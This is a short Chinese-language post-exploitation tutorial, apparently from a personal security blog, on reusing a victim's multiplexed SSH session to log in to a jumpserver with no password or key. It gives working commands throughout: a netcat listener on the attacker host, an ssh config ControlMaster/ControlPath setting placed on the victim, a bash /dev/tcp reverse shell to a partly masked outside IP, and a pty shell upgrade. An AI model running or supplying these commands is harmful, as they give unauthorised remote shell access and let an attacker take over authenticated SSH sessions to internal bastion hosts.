---
title: 如何利用ssh-session会话实现免密免key登录jumpserver及利用
encrypt: true
enc_pwd: askding
categories:
  - Kali
  - PostExploit
date: 2022-01-18 13:08:49
top:
tags:
layout:
---
编写进度
- [x] 


# SSH Session复制,实现免密码登录

![](https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20220118125844.png)


## 在evil执行如下操作
###  监听53端口
```bash
nc -lvp 53
```
### 待 shell反弹后生成完全交互shell
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

### 3-登录jumpserver
```bash
ssh jumpserver
```


## 本地机器victim操作
### 0-在本地机器 `./ssh/config`文件中添加如下字段
```bash
Host *  
ControlMaster auto  
ControlPath /tmp/ssh-%r@%h
```

### 1-登录jumpserver
```bash
ssh jumpserver
```

### 2-执行反弹shell
```bash
bash -c '0<&23-;exec 23<>/dev/tcp/101.1x2.34.104/53;sh <&23 >&23 2>&23'
```


